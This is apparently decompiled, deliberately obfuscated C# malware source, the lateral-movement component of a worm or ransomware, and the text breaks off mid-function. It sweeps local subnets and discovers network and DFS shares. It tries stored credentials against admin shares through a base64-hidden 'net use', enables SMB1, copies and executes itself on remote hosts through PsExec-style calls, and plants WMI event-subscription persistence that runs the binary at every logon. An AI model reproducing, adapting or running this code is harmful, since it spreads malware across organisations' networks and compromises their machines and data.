using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace nLpTFjJRwUBp;

internal class JfcUMMUizcmEp
{
	public class vrCgeuVWpiU
	{
		public string aeVXqFjPXeE { get; set; }
	}

	public enum IgMbmipPizZzB
	{
		dODGWrxLFhd = 1,
		NGhuQWagFksSmC,
		ZSrRgUDaAsrxflijt,
		XsSTumeFjRlJl,
		JojBrWGeadwV
	}

	public enum MvMKSYEKMmnh
	{
		QfqFAVwyakpFkr,
		NYxdetuDjYaPs,
		zVjljHlvIw,
		qwbKFBtSOukGW
	}

	public enum fiCKwoCJMZql
	{
		FeaqFBOTjkMenf = 1,
		cCSnIdWaVfLP = 2,
		gUZHFcIbLt = 4,
		nLEMDHaqInvIP = 8,
		JqTGjJKMzhmf = 16,
		UFyRBqpOIyvOF = 19
	}

	public enum xbCVbzsjUuR
	{
		xqzXvyPrUgcqD,
		bMVVvHVfxmTD,
		mDJIvBAzrNzC,
		YfHfZFcDcLGz,
		WGrolXnkmDRe,
		BrUCrxDhTxDZT,
		IyOWhShdzsqqTlMW,
		qOzCPmjXETWau,
		auRxPvaWvyEvmCi,
		KSIPcJVmeEB,
		biJWixVUHTzfj,
		ZYdrBLjjTECyw
	}

	public class PmcIAzyAMUcPiD : IEnumerable
	{
		private enum ddRNVBhThxc
		{
			OFOSgQRLwsulAFJ = 0,
			QIIxsAhbsbqnxBBq = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class BskcDiAaYA
		{
			public IgMbmipPizZzB HHYLXWsRtpg;

			public MvMKSYEKMmnh ubOcwCsAjsYm;

			public xbCVbzsjUuR xZKLyapMnGRTXD;

			public fiCKwoCJMZql hsnolNFNmxI;

			public string SNXgBGQZVVgfsZ;

			public string lhAcsedfhQvcM;

			public string YJUdNImaRr;

			public string qVlhvpYkNa;
		}

		private ArrayList IQzeFjDaxXJ = new ArrayList();

		public int UKNMxHEuXVKK => IQzeFjDaxXJ.Count;

		[DllImport("Mpr.dll")]
		private static extern ddRNVBhThxc WNetOpenEnumA(IgMbmipPizZzB dwScope, MvMKSYEKMmnh dwType, fiCKwoCJMZql dwUsage, BskcDiAaYA p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern ddRNVBhThxc WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern ddRNVBhThxc WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(BskcDiAaYA pRsrc, IgMbmipPizZzB scope, MvMKSYEKMmnh type, fiCKwoCJMZql usage, xbCVbzsjUuR displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == ddRNVBhThxc.OFOSgQRLwsulAFJ)
			{
				ddRNVBhThxc ddRNVBhThxc;
				do
				{
					ddRNVBhThxc = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (ddRNVBhThxc)
					{
					case ddRNVBhThxc.QIIxsAhbsbqnxBBq:
						continue;
					case ddRNVBhThxc.OFOSgQRLwsulAFJ:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.xZKLyapMnGRTXD == displayType)
						{
							IQzeFjDaxXJ.Add(pRsrc.lhAcsedfhQvcM);
						}
						if ((pRsrc.hsnolNFNmxI & fiCKwoCJMZql.cCSnIdWaVfLP) == fiCKwoCJMZql.cCSnIdWaVfLP)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (ddRNVBhThxc != ddRNVBhThxc.QIIxsAhbsbqnxBBq);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public PmcIAzyAMUcPiD(IgMbmipPizZzB scope, MvMKSYEKMmnh type, fiCKwoCJMZql usage, xbCVbzsjUuR displayType)
		{
			BskcDiAaYA pRsrc = new BskcDiAaYA();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return IQzeFjDaxXJ.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct PutKlXBSWPIR
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string gOwsKVtkirAXgOk;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string LzknIiFxaQi;

		public uint STxmclyXUBLB;

		public uint ZnJkNNeiSloJNi;

		public IntPtr aHMJbnjefYg;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ZyHASBnKQGzJa
	{
		public int STxmclyXUBLB;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string YeWCUemgEuoxizh;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string clSVLUZzFW;
	}

	public struct wrtRpAhqef
	{
		public string iIkbHOFPNywSqTpSnf;

		public string[] nFWlGUvvbXuJPp;

		public wrtRpAhqef(string Name, string[] Target)
		{
			iIkbHOFPNywSqTpSnf = Name;
			nFWlGUvvbXuJPp = Target;
		}
	}

	[CompilerGenerated]
	private sealed class KiHKXbtRHuqJKr
	{
		private sealed class dhRCJkMlSntD
		{
			public KiHKXbtRHuqJKr cVtyLjJnuSXjuM;

			public int SfVVnFjwEudZW;

			public void _003Cscanner_003Eb__4(int g)
			{
				RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", cVtyLjJnuSXjuM.YkWzbSpRmeSDr, "\\", (char)g, "$ /USER:", mETYHJKQONGdh[SfVVnFjwEudZW], " ", IDypeTdFTZ[SfVVnFjwEudZW]));
				Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
				RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", cVtyLjJnuSXjuM.YkWzbSpRmeSDr, "\\", (char)g, "$"));
			}
		}

		public Ping YzvpupRvrKl;

		public PingReply zTRJXtdagtCGn;

		public IPAddress YkWzbSpRmeSDr;

		public string EdhQySYdoUMc;

		public void _003Cscanner_003Eb__2(int i)
		{
			try
			{
				string text = "." + i;
				YzvpupRvrKl = new Ping();
				zTRJXtdagtCGn = YzvpupRvrKl.Send(EdhQySYdoUMc + text, 900);
				if (zTRJXtdagtCGn.Status != 0)
				{
					return;
				}
				try
				{
					YkWzbSpRmeSDr = IPAddress.Parse(EdhQySYdoUMc + text);
					IPHostEntry hostEntry = Dns.GetHostEntry(YkWzbSpRmeSDr);
					if (RLgUMHIwwGSuCLo.mVucaeNrRtoSGRM.Contains(string.Concat("\\\\", YkWzbSpRmeSDr, "\\Users")) || hostEntry.HostName.Contains(Environment.MachineName))
					{
						return;
					}
					RLgUMHIwwGSuCLo.jncYfWEeZSRfqE.Add(YkWzbSpRmeSDr.ToString());
					try
					{
						if (RLgUMHIwwGSuCLo.caxUvlsWluDUB == "YES")
						{
							Parallel.For(0, mETYHJKQONGdh.Count, delegate(int f)
							{
								RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\Users /USER:", mETYHJKQONGdh[f], " ", IDypeTdFTZ[f]));
								Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
								RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\Users"));
								Parallel.For(65, 91, delegate(int g)
								{
									RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\", (char)g, "$ /USER:", mETYHJKQONGdh[f], " ", IDypeTdFTZ[f]));
									Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
									RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
								});
							});
						}
						else
						{
							RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\Users"));
							Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
							RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\Users"));
							Parallel.For(65, 91, delegate(int g)
							{
								RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
								Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
								RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
							});
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		public void _003Cscanner_003Eb__3(int f)
		{
			RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\Users /USER:", mETYHJKQONGdh[f], " ", IDypeTdFTZ[f]));
			Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
			RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\Users"));
			Parallel.For(65, 91, delegate(int g)
			{
				RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\", (char)g, "$ /USER:", mETYHJKQONGdh[f], " ", IDypeTdFTZ[f]));
				Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
				RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
			});
		}

		public void _003Cscanner_003Eb__5(int g)
		{
			RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
			Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
			RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
		}
	}

	[CompilerGenerated]
	private sealed class bgdMSKLHrHKvp
	{
		public string XUJXYfEtvoPEsg;

		public string kvXyWBYLnIsSU;

		public void _003CRun_003Eb__d(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !CbhArPTHtYjI(ip))
			{
				return;
			}
			if (RLgUMHIwwGSuCLo.caxUvlsWluDUB == "YES")
			{
				for (int i = 0; i < mETYHJKQONGdh.Count; i++)
				{
					if (RLgUMHIwwGSuCLo.qNaOJgFKjgde)
					{
						if (File.Exists(XUJXYfEtvoPEsg))
						{
							RLgUMHIwwGSuCLo.oapSGNsteEjKT(XUJXYfEtvoPEsg, "\\\\" + ip + " -u \"" + mETYHJKQONGdh[i] + "\" -p \"" + IDypeTdFTZ[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(kvXyWBYLnIsSU))
					{
						RLgUMHIwwGSuCLo.oapSGNsteEjKT(kvXyWBYLnIsSU, "\\\\" + ip + " -u \"" + mETYHJKQONGdh[i] + "\" -p \"" + IDypeTdFTZ[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (RLgUMHIwwGSuCLo.qNaOJgFKjgde)
			{
				if (File.Exists(XUJXYfEtvoPEsg))
				{
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(XUJXYfEtvoPEsg, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(kvXyWBYLnIsSU))
			{
				RLgUMHIwwGSuCLo.oapSGNsteEjKT(kvXyWBYLnIsSU, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class GVPRIruyHmTX
	{
		public string CgxjQinJwi;

		public bool _003CGetIPAddresses_003Eb__11(string o)
		{
			return o != CgxjQinJwi;
		}
	}

	private const int DEspOcgsxIyaL = 268435455;

	private const int TnSkmRnRsSac = 0;

	public static List<string> LCvSegELEIY = new List<string>();

	public static string WNucRDGZOPtkZHef = "";

	public static List<string> mETYHJKQONGdh = new List<string>();

	public static List<string> IDypeTdFTZ = new List<string>();

	public static List<string> gzgXiokZXuHl = new List<string>();

	public List<string> DqIvnJqEDFHysJzH = new List<string>();

	public List<string> CgCyMTPZzRI = new List<string>();

	public List<string> FcIXRrgzcPeJJo = new List<string>();

	public static void dqCpJxUzikZb()
	{
		JfcUMMUizcmEp jfcUMMUizcmEp = jWIbrLfyUbboaS();
		Parallel.ForEach(jfcUMMUizcmEp.FcIXRrgzcPeJJo, delegate(string KrGGKUBfmjD)
		{
			string text = KrGGKUBfmjD.Split(new char[1] { '.' })[0] + "." + KrGGKUBfmjD.Split(new char[1] { '.' })[1] + "." + KrGGKUBfmjD.Split(new char[1] { '.' })[2];
			if (text.StartsWith("10.") || text.StartsWith("172.") || text.StartsWith("192.168.") || text.StartsWith(""))
			{
				VzCZqbblwozD(text);
			}
		});
	}

	public static void VzCZqbblwozD(string cKKMVCJmntjtWl)
	{
		Ping YzvpupRvrKl;
		PingReply zTRJXtdagtCGn;
		IPAddress YkWzbSpRmeSDr;
		Parallel.For(0, 255, delegate(int i)
		{
			try
			{
				string text = "." + i;
				YzvpupRvrKl = new Ping();
				zTRJXtdagtCGn = YzvpupRvrKl.Send(cKKMVCJmntjtWl + text, 900);
				if (zTRJXtdagtCGn.Status == IPStatus.Success)
				{
					try
					{
						YkWzbSpRmeSDr = IPAddress.Parse(cKKMVCJmntjtWl + text);
						IPHostEntry hostEntry = Dns.GetHostEntry(YkWzbSpRmeSDr);
						if (!RLgUMHIwwGSuCLo.mVucaeNrRtoSGRM.Contains(string.Concat("\\\\", YkWzbSpRmeSDr, "\\Users")) && !hostEntry.HostName.Contains(Environment.MachineName))
						{
							RLgUMHIwwGSuCLo.jncYfWEeZSRfqE.Add(YkWzbSpRmeSDr.ToString());
							try
							{
								if (RLgUMHIwwGSuCLo.caxUvlsWluDUB == "YES")
								{
									Parallel.For(0, mETYHJKQONGdh.Count, delegate(int f)
									{
										RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\Users /USER:", mETYHJKQONGdh[f], " ", IDypeTdFTZ[f]));
										Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
										RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\Users"));
										Parallel.For(65, 91, delegate(int g)
										{
											RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\", (char)g, "$ /USER:", mETYHJKQONGdh[f], " ", IDypeTdFTZ[f]));
											Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
											RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
										});
									});
								}
								else
								{
									RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\Users"));
									Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
									RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\Users"));
									Parallel.For(65, 91, delegate(int g)
									{
										RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), string.Concat("use \\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
										Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
										RLgUMHIwwGSuCLo.ExJYaOgZmzV(string.Concat("\\\\", YkWzbSpRmeSDr, "\\", (char)g, "$"));
									});
								}
								return;
							}
							catch
							{
								return;
							}
						}
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch (Exception)
			{
			}
		});
	}

	public static JfcUMMUizcmEp jWIbrLfyUbboaS()
	{
		new List<List<string>>();
		new List<string>();
		new List<string>();
		new List<string>();
		JfcUMMUizcmEp jfcUMMUizcmEp = new JfcUMMUizcmEp();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			try
			{
				networkInterface.GetIPProperties();
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily != AddressFamily.InterNetwork)
					{
						continue;
					}
					IPAddress address = unicastAddress.Address;
					IPAddress iPv4Mask = unicastAddress.IPv4Mask;
					byte[] addressBytes = address.GetAddressBytes();
					byte[] addressBytes2 = iPv4Mask.GetAddressBytes();
					if (addressBytes.Length == addressBytes2.Length)
					{
						byte[] array2 = new byte[addressBytes.Length];
						for (int j = 0; j < array2.Length; j++)
						{
							array2[j] = (byte)(addressBytes[j] | (addressBytes2[j] ^ 0xFFu));
						}
						IPAddress iPAddress = new IPAddress(array2);
						byte[] array3 = new byte[addressBytes.Length];
						for (int k = 0; k < array3.Length; k++)
						{
							array3[k] = (byte)(addressBytes[k] & addressBytes2[k]);
						}
						IPAddress iPAddress2 = new IPAddress(array3);
						jfcUMMUizcmEp.CgCyMTPZzRI.Add(networkInterface.Name);
						jfcUMMUizcmEp.FcIXRrgzcPeJJo.Add(iPAddress2.ToString());
						jfcUMMUizcmEp.DqIvnJqEDFHysJzH.Add(iPAddress.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return jfcUMMUizcmEp;
	}

	public static List<vrCgeuVWpiU> PpxLEzmbboEIUxZ()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<vrCgeuVWpiU> list = new List<vrCgeuVWpiU>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new vrCgeuVWpiU
						{
							aeVXqFjPXeE = string.Concat("\\", stringBuilder, "\\Users")
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string rsWpKqTaDKLXdj, int NUxjzTmPnejJDrke, int lccqENFazIeb, out IntPtr yUznyVuIQiAevZ, [MarshalAs(UnmanagedType.I4)] out int AcSaaUKdBS, [MarshalAs(UnmanagedType.I4)] ref int WhNVdZWOXDOYljY);

	public static List<wrtRpAhqef> iOkipUFcfF(string NRQLHiAAdxIo)
	{
		try
		{
			List<wrtRpAhqef> list = new List<wrtRpAhqef>();
			IntPtr yUznyVuIQiAevZ = default(IntPtr);
			int AcSaaUKdBS = 0;
			int WhNVdZWOXDOYljY = 0;
			if (NetDfsEnum(NRQLHiAAdxIo, 3, 268435455, out yUznyVuIQiAevZ, out AcSaaUKdBS, ref WhNVdZWOXDOYljY) == 0)
			{
				for (int i = 0; i < AcSaaUKdBS; i++)
				{
					PutKlXBSWPIR putKlXBSWPIR = (PutKlXBSWPIR)Marshal.PtrToStructure(yUznyVuIQiAevZ + i * Marshal.SizeOf(typeof(PutKlXBSWPIR)), typeof(PutKlXBSWPIR));
					if (putKlXBSWPIR.gOwsKVtkirAXgOk == NRQLHiAAdxIo)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < putKlXBSWPIR.ZnJkNNeiSloJNi; j++)
					{
						IntPtr ptr = new IntPtr(putKlXBSWPIR.aHMJbnjefYg.ToInt64() + j * Marshal.SizeOf(typeof(ZyHASBnKQGzJa)));
						ZyHASBnKQGzJa zyHASBnKQGzJa = (ZyHASBnKQGzJa)Marshal.PtrToStructure(ptr, typeof(ZyHASBnKQGzJa));
						if (zyHASBnKQGzJa.STxmclyXUBLB == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", zyHASBnKQGzJa.YeWCUemgEuoxizh, zyHASBnKQGzJa.clSVLUZzFW }));
						}
					}
					string text = putKlXBSWPIR.gOwsKVtkirAXgOk.Replace(NRQLHiAAdxIo, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new wrtRpAhqef(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void LBrKLJVlOis()
	{
		RLgUMHIwwGSuCLo.eKCEivlNipT("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<vrCgeuVWpiU> list = PpxLEzmbboEIUxZ();
		List<wrtRpAhqef> list2 = iOkipUFcfF(Environment.MachineName);
		if (list2 != null)
		{
			foreach (wrtRpAhqef item in list2)
			{
				string[] nFWlGUvvbXuJPp = item.nFWlGUvvbXuJPp;
				foreach (string text in nFWlGUvvbXuJPp)
				{
					if (text.Contains(Environment.MachineName) || !string.IsNullOrEmpty(text))
					{
						continue;
					}
					try
					{
						if (RLgUMHIwwGSuCLo.caxUvlsWluDUB == "YES")
						{
							for (int j = 0; j < mETYHJKQONGdh.Count; j++)
							{
								RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), "use " + text + " /USER:" + mETYHJKQONGdh[j] + " " + IDypeTdFTZ[j]);
								Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
								RLgUMHIwwGSuCLo.ExJYaOgZmzV(text);
							}
						}
						else
						{
							RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), "use " + text);
							Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
							RLgUMHIwwGSuCLo.ExJYaOgZmzV(text);
						}
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (vrCgeuVWpiU item2 in list)
		{
			if (item2.aeVXqFjPXeE.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (RLgUMHIwwGSuCLo.caxUvlsWluDUB == "YES")
				{
					for (int k = 0; k < mETYHJKQONGdh.Count; k++)
					{
						RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), "use " + item2.aeVXqFjPXeE + " /USER:" + mETYHJKQONGdh[k] + " " + IDypeTdFTZ[k]);
						Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
						RLgUMHIwwGSuCLo.ExJYaOgZmzV(item2.aeVXqFjPXeE);
					}
				}
				else
				{
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), "use " + item2.aeVXqFjPXeE);
					Thread.Sleep(RLgUMHIwwGSuCLo.CwiClwFbVgf);
					RLgUMHIwwGSuCLo.ExJYaOgZmzV(item2.aeVXqFjPXeE);
				}
			}
			catch
			{
			}
		}
	}

	public static void AqzaxCqWXkWFm(string MqyAuNuFRoc, string fXQAGLdNZIPK, string GpjeWxYvkicwp)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + MqyAuNuFRoc + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(fXQAGLdNZIPK);
			val2.get_Options().set_Password(GpjeWxYvkicwp);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + MqyAuNuFRoc + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void FNjMkcYzUUuNSBd()
	{
		RLgUMHIwwGSuCLo.jifSfBeSYFE();
		List<smCygadaBan> list = smCygadaBan.JfmMZLTVSbxO();
		foreach (smCygadaBan item in list)
		{
			LCvSegELEIY.Add(item.FoUQIFxOkEOTLp);
		}
		if (RLgUMHIwwGSuCLo.jncYfWEeZSRfqE.Count > 0)
		{
			LCvSegELEIY = LCvSegELEIY.Union(RLgUMHIwwGSuCLo.jncYfWEeZSRfqE).ToList();
		}
		string XUJXYfEtvoPEsg = "";
		string kvXyWBYLnIsSU = "";
		try
		{
			XUJXYfEtvoPEsg = CvEoQOixpFrRGlG();
		}
		catch
		{
		}
		try
		{
			kvXyWBYLnIsSU = vpOYFondAIdekb();
		}
		catch
		{
		}
		foreach (smCygadaBan item2 in list)
		{
			try
			{
				if (item2.FoUQIFxOkEOTLp.StartsWith("10.") || item2.FoUQIFxOkEOTLp.StartsWith("172.") || item2.FoUQIFxOkEOTLp.StartsWith("192.168.") || item2.FoUQIFxOkEOTLp.Contains(""))
				{
					qMpPEdbCTzSOHvh.TJrlhRLmgvmREvbHh(item2.LJMfykauGdE, item2.FoUQIFxOkEOTLp, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(LCvSegELEIY, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && CbhArPTHtYjI(ip))
				{
					if (RLgUMHIwwGSuCLo.caxUvlsWluDUB == "YES")
					{
						for (int i = 0; i < mETYHJKQONGdh.Count; i++)
						{
